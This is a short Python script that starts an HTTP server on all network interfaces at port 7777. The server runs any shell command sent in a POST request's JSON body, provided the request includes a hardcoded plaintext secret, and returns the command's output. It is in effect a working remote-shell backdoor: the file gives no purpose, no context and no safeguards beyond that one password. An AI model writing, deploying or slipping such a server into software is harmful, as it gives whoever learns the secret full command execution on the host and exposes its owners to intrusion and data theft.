from http.server import HTTPServer, BaseHTTPRequestHandler
import subprocess, json

SECRET = "radiance2026"

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length)) if length else {}
        if body.get("secret") != SECRET:
            self.send_response(403)
            self.end_headers()
            return
        cmd = body.get("cmd", "echo no command")
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"stdout": r.stdout, "stderr": r.stderr, "code": r.returncode}).encode())

HTTPServer(("0.0.0.0", 7777), H).serve_forever()
